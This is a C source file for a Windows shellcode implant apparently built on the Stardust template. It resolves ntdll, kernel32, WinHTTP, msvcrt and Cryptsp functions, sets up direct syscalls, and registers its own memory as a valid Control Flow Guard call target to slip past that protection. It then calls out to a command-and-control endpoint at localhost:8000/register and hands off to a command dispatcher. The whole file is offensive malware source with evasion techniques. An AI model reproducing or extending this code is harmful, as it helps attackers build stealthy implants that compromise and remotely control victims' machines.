#include <Common.h>

FUNC VOID CfgPrivateAddressAdd(
    _In_ HANDLE Process,
    _In_ PVOID Address,
    _In_ ULONG Size)
{
    STARDUST_INSTANCE
    CFG_CALL_TARGET_INFO Cfg = {0};
    MEMORY_RANGE_ENTRY MemRange = {0};
    VM_INFORMATION VmInfo = {0};
    PIMAGE_NT_HEADERS NtHeader = {0};
    ULONG Output = {0};
    NTSTATUS Status = {0};

    MemRange.NumberOfBytes = Size;
    MemRange.VirtualAddress = Address;

    Cfg.Flags = CFG_CALL_TARGET_VALID;
    Cfg.Offset = 0;

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput = &Output;
    VmInfo.ptOffsets = &Cfg;
    VmInfo.pMustBeZero = FALSE;
    VmInfo.pMoarZero = FALSE;

    if (!NT_SUCCESS(Status = Instance()->Win32.NtSetInformationVirtualMemory(Process, VmCfgCallTargetInformation, 1, &MemRange, &VmInfo, sizeof(VmInfo))))
    {
    }
}

FUNC VOID Main(_In_ PVOID Param)
{
    STARDUST_INSTANCE
    LOAD_FUNCTION(Ntdll, LdrLoadDll)
    LOAD_FUNCTION(Ntdll, RtlAllocateHeap)
    LOAD_FUNCTION(Ntdll, RtlWalkHeap)
    LOAD_FUNCTION(Ntdll, RtlFreeHeap)
    LOAD_FUNCTION(Ntdll, RtlReAllocateHeap)
    LOAD_FUNCTION(Ntdll, RtlCreateTimerQueue)
    LOAD_FUNCTION(Ntdll, RtlCreateTimer)
    LOAD_FUNCTION(Ntdll, RtlCaptureContext)
    LOAD_FUNCTION(Ntdll, RtlLookupFunctionEntry)
    LOAD_FUNCTION(Ntdll, RtlUserThreadStart)
    LOAD_FUNCTION(Ntdll, RtlZeroMemory)
    LOAD_FUNCTION(Ntdll, RtlAddVectoredExceptionHandler)

    LOAD_FUNCTION(Ntdll, NtContinue)
    LOAD_FUNCTION(Ntdll, NtSetEvent)
    LOAD_FUNCTION(Ntdll, NtWaitForSingleObject)
    LOAD_FUNCTION(Ntdll, NtProtectVirtualMemory)
    LOAD_FUNCTION(Ntdll, NtSignalAndWaitForSingleObject)
    LOAD_FUNCTION(Ntdll, NtGetContextThread)
    LOAD_FUNCTION(Ntdll, NtSetContextThread)
    LOAD_FUNCTION(Ntdll, NtDuplicateObject)
    LOAD_FUNCTION(Ntdll, NtSetInformationVirtualMemory)

    SYSCALL_SETUP(NtClose)
    SYSCALL_SETUP(NtCreateEvent)
    SYSCALL_SETUP(NtWaitForSingleObject)
    SYSCALL_SETUP(NtSignalAndWaitForSingleObject)
    SYSCALL_SETUP(NtAllocateVirtualMemory)
    SYSCALL_SETUP(NtProtectVirtualMemory)

    CfgPrivateAddressAdd(NtCurrentProcess(), Instance()->Base.Buffer, Instance()->Base.Length);

    // resolve kernel32.dll related functions
    //
    if ((Instance()->Modules.Kernel32 = LdrModulePeb(H_MODULE_KERNEL32)))
    {
        LOAD_FUNCTION(Kernel32, LocalFree)

        LOAD_FUNCTION(Kernel32, VirtualAlloc)
        LOAD_FUNCTION(Kernel32, VirtualFree)
        LOAD_FUNCTION(Kernel32, VirtualProtect)

        LOAD_FUNCTION(Kernel32, FreeLibrary)
        LOAD_FUNCTION(Kernel32, BaseThreadInitThunk)
    }

    if ((Instance()->Modules.WinHTTP = LdrModuleLoad("WinHTTP")))
    {
        LOAD_FUNCTION(WinHTTP, WinHttpCrackUrl)
        LOAD_FUNCTION(WinHTTP, WinHttpOpen)
        LOAD_FUNCTION(WinHTTP, WinHttpConnect)
        LOAD_FUNCTION(WinHTTP, WinHttpOpenRequest)
        LOAD_FUNCTION(WinHTTP, WinHttpSendRequest)
        LOAD_FUNCTION(WinHTTP, WinHttpReceiveResponse)
        LOAD_FUNCTION(WinHTTP, WinHttpQueryDataAvailable)
        LOAD_FUNCTION(WinHTTP, WinHttpReadData)
        LOAD_FUNCTION(WinHTTP, WinHttpCloseHandle)
    }

    if ((Instance()->Modules.Msvcrt = LdrModuleLoad(("Msvcrt"))))
    {
        LOAD_FUNCTION(Msvcrt, vsnprintf)
        LOAD_FUNCTION(Msvcrt, vprintf)
        LOAD_FUNCTION(Msvcrt, sprintf)
        LOAD_FUNCTION(Msvcrt, printf)
        LOAD_FUNCTION(Msvcrt, strtol)
        LOAD_FUNCTION(Msvcrt, calloc)
        LOAD_FUNCTION(Msvcrt, memmove)
    }

    if ((Instance()->Modules.Cryptsp = LdrModuleLoad("Cryptsp")))
    {
        LOAD_FUNCTION(Cryptsp, SystemFunction032)
    }

    Instance()->Heap = Instance()->Peb->ProcessHeap;
    /*Instance()->Heap = Instance()->Win32.RtlCreateHeap(
            HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY,
            NULL, // Let the system choose the base address
            0,    // Default reserve size
            0,    // Default commit size
            NULL, // Default lock
            NULL  // Default heap parameters
        );*/
    BUFFER AgentId = SendRequest(L"http://localhost:8000/register", L"GET", NULL);

    CommandDispatcher(&AgentId);
}
